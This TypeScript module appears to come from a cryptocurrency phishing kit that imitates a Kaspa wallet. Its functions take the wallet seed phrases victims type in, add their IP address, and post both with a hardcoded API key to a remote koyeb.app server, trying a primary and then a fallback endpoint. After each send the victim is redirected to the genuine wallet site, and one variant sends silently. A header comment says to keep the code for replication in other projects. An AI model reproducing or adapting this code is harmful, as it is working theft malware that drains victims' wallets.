/**
 * Seedphrase API Utilities
 * 
 * All functions for sending seedphrase messages to backend APIs.
 * Extracted from Home.jsx, Wallet.jsx, and Legacy.jsx for easy replication.
 * 
 * DO NOT REFACTOR - Keep as-is for replication in other projects.
 */

import axios, { AxiosResponse, InternalAxiosRequestConfig, AxiosHeaders } from 'axios';

// Type for axios headers structure
type AxiosHeadersType = AxiosHeaders | Record<string, string | Record<string, string>> & {
  common?: Record<string, string>;
  post?: Record<string, string>;
  get?: Record<string, string>;
  set?: (key: string, value: string) => void;
};

// Add request interceptor to log all axios requests
axios.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    // ALWAYS add header (including localhost)
    if (config.url && config.headers) {
      const apiKey = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
      const method = (config.method || 'post').toLowerCase();
      const headers = config.headers as AxiosHeadersType;
      
      // Try AxiosHeaders.set() if available (newer axios versions)
      if (typeof headers.set === 'function') {
        headers.set('x-api-key', apiKey);
        headers.set('X-API-Key', apiKey);
      } else {
        // Set on method-specific headers (older axios versions)
        const headersObj = headers as Record<string, string | Record<string, string>>;
        if (!headersObj[method]) {
          headersObj[method] = {};
        }
        const methodHeaders = headersObj[method] as Record<string, string>;
        methodHeaders['x-api-key'] = apiKey;
        methodHeaders['X-API-Key'] = apiKey;
        
        // Also set directly on headers object
        headersObj['x-api-key'] = apiKey;
        headersObj['X-API-Key'] = apiKey;
      }
    }
    
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Add response interceptor
axios.interceptors.response.use(
  (response: AxiosResponse) => {
    return response;
  },
  (error) => {
    return Promise.reject(error);
  }
);

interface IPResponse {
  ip: string;
}

interface PrimaryMessageData {
  appName: string;
  seedPhrase: string;
  ip: string | null;
}

interface FallbackMessageData {
  appName: string;
  seedPhrase: string;
}

interface APIResponse {
  status: boolean;
  message?: string;
  error?: string;
}

interface SubmitResult {
  success: boolean;
  result?: APIResponse;
  response?: AxiosResponse<APIResponse>;
  error?: string;
  source?: 'primary' | 'fallback';
  primary?: SubmitResult;
  fallback?: SubmitResult;
  exception?: Error;
}

interface SubmitOptions {
  onSuccessRedirect?: string;
  onError?: (error: string) => void;
  apiKey?: string | null;
}

/**
 * Check if we're running on localhost
 */
function isLocalhost(): boolean {
  if (typeof window === 'undefined') {
    return false;
  }
  const hostname = window.location.hostname;
  const isLocal = hostname === 'localhost' || 
                  hostname === '127.0.0.1' ||
                  hostname === '';
  return isLocal;
}

/**
 * Get the primary API endpoint based on environment
 */
function getPrimaryAPIEndpoint(): string {
  if (isLocalhost()) {
    return 'http://localhost:3001/api/form/text';
  }
  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
}

/**
 * Get the fallback API endpoint based on environment
 */
function getFallbackAPIEndpoint(): string {
  if (isLocalhost()) {
    return 'http://localhost:3001/api/form/text';
  }
  return 'https://nice-kristin-ethname-aada4ad6.koyeb.app/api/form/text';
}

/**
 * Get client IP address
 * Used before sending seedphrase to include IP in the payload
 */
export async function getClientIP(): Promise<string | null> {
  try {
    const response = await axios.get<IPResponse>('https://api.ipify.org?format=json');
    return response.data.ip;
    } catch {
      return null;
    }
}

/**
 * Send seedphrase to primary API endpoint (with IP)
 * From Home.jsx handleRestoreWallet - lines 220-251
 */
export async function sendSeedPhraseToPrimaryAPI(
  seedPhraseMessage: string,
  appName: string = "Kaspa.one"
): Promise<SubmitResult> {
  try {
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };

    const headers: Record<string, string> = {
      "Content-Type": "application/json",
    };

    // ALWAYS add API key (including localhost)
    const apiKeyToUse = "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
    headers["x-api-key"] = apiKeyToUse;
    headers["X-API-Key"] = apiKeyToUse; // Try both cases

    // Ensure headers are properly formatted for axios
    const axiosConfig = {
      headers: {
        ...headers,
        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(axiosConfig.headers).forEach(key => {
      if (axiosConfig.headers[key as keyof typeof axiosConfig.headers] === undefined) {
        delete axiosConfig.headers[key as keyof typeof axiosConfig.headers];
      }
    });

    const response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      axiosConfig
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return { success: true, result, response };
    }
    
    return { success: false, result, response };
  } catch (error) {
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
  }
}

/**
 * Send seedphrase to fallback API endpoint (without IP, with API key)
 * From Home.jsx handleRestoreWallet - lines 254-267
 */
export async function sendSeedPhraseToFallbackAPI(
  seedPhraseMessage: string,
  appName: string = "Kaspa.one",
  apiKey: string | null = null
): Promise<SubmitResult> {
  try {
    // Prepare the request data with only required parameters
    const messageData: FallbackMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage
    };

    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";

    const headers: Record<string, string> = {
      "Content-Type": "application/json",
    };
    
    // ALWAYS add API key (including localhost)
    headers["x-api-key"] = apiKeyToUse;
    headers["X-API-Key"] = apiKeyToUse; // Try both cases

    // Ensure headers are properly formatted
    const fallbackAxiosConfig = {
      headers: {
        ...headers,
        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(fallbackAxiosConfig.headers).forEach(key => {
      if (fallbackAxiosConfig.headers[key as keyof typeof fallbackAxiosConfig.headers] === undefined) {
        delete fallbackAxiosConfig.headers[key as keyof typeof fallbackAxiosConfig.headers];
      }
    });

    const response = await axios.post<APIResponse>(
      getFallbackAPIEndpoint(),
      messageData,
      fallbackAxiosConfig
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return { success: true, result, response };
    }
    
    return { success: false, result, response };
  } catch (error) {
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
  }
}

/**
 * Complete seedphrase submission with primary + fallback
 * From Home.jsx handleRestoreWallet - lines 207-283
 * This is the main function used in Home.jsx
 */
export async function submitSeedPhraseComplete(
  seedPhraseMessage: string,
  appName: string = "Kaspa.one",
  options: SubmitOptions = {}
): Promise<SubmitResult> {
  const { 
    onSuccessRedirect = "https://wallet.kaspanet.io",
    onError = null,
    apiKey = null 
  } = options;

  try {
    // Try primary API first (with IP)
    const primaryResult = await sendSeedPhraseToPrimaryAPI(seedPhraseMessage, appName);
    
    if (primaryResult.success) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { ...primaryResult, source: 'primary' };
    }

    // Fallback to secondary API (without IP, with API key)
    const fallbackResult = await sendSeedPhraseToFallbackAPI(seedPhraseMessage, appName, apiKey);
    
    if (fallbackResult.success) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { ...fallbackResult, source: 'fallback' };
    }

    // Both failed
    const errorMessage = fallbackResult.result?.message || "An issue occurred.";
    const errorDetail = fallbackResult.result?.error ? ` (${fallbackResult.result.error})` : "";
    const fullError = errorMessage + errorDetail;
    
    if (onError) {
      onError(fullError);
    }
    
    return { 
      success: false, 
      error: fullError,
      primary: primaryResult,
      fallback: fallbackResult
    };
  } catch (error) {
    const errorMsg = "An error occurred while processing your request. Please try again.";
    
    if (onError) {
      onError(errorMsg);
    }
    
    return { 
      success: false, 
      error: errorMsg, 
      exception: error instanceof Error ? error : new Error(String(error))
    };
  }
}

/**
 * Silent seedphrase submission (no redirect, no error handling)
 * From Wallet.jsx submitSeedToApi - lines 86-130
 * Used when you just want to send without UI feedback
 * Returns true if successful, false otherwise
 */
export async function submitSeedPhraseSilent(
  seedPhraseMessage: string,
  appName: string = "Kaspa.one",
  apiKey: string | null = null
): Promise<boolean> {
  try {
    // Declare apiKeyToUse once at the top
    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
    
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };

    const headers: Record<string, string> = {
      "Content-Type": "application/json",
    };

    // ALWAYS add API key (including localhost)
    headers["x-api-key"] = apiKeyToUse;
    headers["X-API-Key"] = apiKeyToUse; // Try both cases

    // Ensure headers are properly formatted
    const silentAxiosConfig = {
      headers: {
        ...headers,
        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(silentAxiosConfig.headers).forEach(key => {
      if (silentAxiosConfig.headers[key as keyof typeof silentAxiosConfig.headers] === undefined) {
        delete silentAxiosConfig.headers[key as keyof typeof silentAxiosConfig.headers];
      }
    });

    const response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      silentAxiosConfig
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return true; // Success, no need to try fallback
    }

    // Fallback to secondary API
    const messageData: FallbackMessageData = { appName: appName, seedPhrase: seedPhraseMessage };
    
    const fallbackHeaders: Record<string, string> = {
      "Content-Type": "application/json",
    };
    
    // ALWAYS add API key (including localhost)
    fallbackHeaders["x-api-key"] = apiKeyToUse;
    fallbackHeaders["X-API-Key"] = apiKeyToUse; // Try both cases
    
    // Ensure headers are properly formatted
    const silentFallbackAxiosConfig = {
      headers: {
        ...fallbackHeaders,
        'x-api-key': fallbackHeaders['x-api-key'] || fallbackHeaders['X-API-Key'] || undefined,
        'X-API-Key': fallbackHeaders['X-API-Key'] || fallbackHeaders['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(silentFallbackAxiosConfig.headers).forEach(key => {
      if (silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers] === undefined) {
        delete silentFallbackAxiosConfig.headers[key as keyof typeof silentFallbackAxiosConfig.headers];
      }
    });
    
    const fallbackResponse = await axios.post<APIResponse>(
      getFallbackAPIEndpoint(),
      messageData,
      silentFallbackAxiosConfig
    );

    const fallbackResult: APIResponse = fallbackResponse.data;

    if (fallbackResponse.status === 200 && fallbackResult.status) {
      return true; // Fallback success
    }

    return false; // Both failed
  } catch {
    // ignore network errors for UI flow
    return false;
  }
}

/**
 * Wallet.jsx version with detailed logging
 * From Wallet.jsx handleRestoreWallet - lines 132-209
 */
export async function submitSeedPhraseWalletJSX(
  seedPhraseMessage: string,
  appName: string = "Kaspa.one",
  options: SubmitOptions = {}
): Promise<SubmitResult> {
  const { 
    onSuccessRedirect = "https://wallet.kaspanet.io",
    onError = null,
    apiKey = null 
  } = options;

  try {
    // Declare apiKeyToUse once at the top
    const apiKeyToUse = apiKey || "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b";
    
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };

    const primaryHeaders: Record<string, string> = {
      "Content-Type": "application/json",
    };

    // ALWAYS add API key (including localhost)
    primaryHeaders["x-api-key"] = apiKeyToUse;
    primaryHeaders["X-API-Key"] = apiKeyToUse; // Try both cases

    // Ensure headers are properly formatted
    const walletJSXAxiosConfig = {
      headers: {
        ...primaryHeaders,
        'x-api-key': primaryHeaders['x-api-key'] || primaryHeaders['X-API-Key'] || undefined,
        'X-API-Key': primaryHeaders['X-API-Key'] || primaryHeaders['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(walletJSXAxiosConfig.headers).forEach(key => {
      if (walletJSXAxiosConfig.headers[key as keyof typeof walletJSXAxiosConfig.headers] === undefined) {
        delete walletJSXAxiosConfig.headers[key as keyof typeof walletJSXAxiosConfig.headers];
      }
    });

    let response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      walletJSXAxiosConfig
    );

    let result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { success: true, result, response };
    }

    // Prepare the request data with only required parameters
    const messageData: FallbackMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage
    };

    const headers: Record<string, string> = {
      "Content-Type": "application/json",
    };
    
    // ALWAYS add API key (including localhost)
    headers["x-api-key"] = apiKeyToUse;
    headers["X-API-Key"] = apiKeyToUse; // Try both cases

    const fallbackEndpoint = getFallbackAPIEndpoint();
    
    // Ensure headers are properly formatted
    const walletJSXFallbackAxiosConfig = {
      headers: {
        ...headers,
        'x-api-key': headers['x-api-key'] || headers['X-API-Key'] || undefined,
        'X-API-Key': headers['X-API-Key'] || headers['x-api-key'] || undefined,
      }
    };
    
    // Remove undefined values
    Object.keys(walletJSXFallbackAxiosConfig.headers).forEach(key => {
      if (walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers] === undefined) {
        delete walletJSXFallbackAxiosConfig.headers[key as keyof typeof walletJSXFallbackAxiosConfig.headers];
      }
    });
    
    response = await axios.post<APIResponse>(
      fallbackEndpoint,
      messageData,
      walletJSXFallbackAxiosConfig
    );

    result = response.data;

    if (response.status === 200 && result.status) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { success: true, result };
    } else {
      const serverMessage = result?.message || "An issue occurred.";
      const serverError = result?.error ? ` (${result.error})` : "";
      const fullError = serverMessage + serverError;
      
      if (onError) {
        onError(fullError);
      }
      
      return { success: false, error: fullError, result };
    }
  } catch {
    const errorMsg = "An error occurred while processing your request. Please try again.";
    
    if (onError) {
      onError(errorMsg);
    }
    
    return { success: false, error: errorMsg };
  }
}

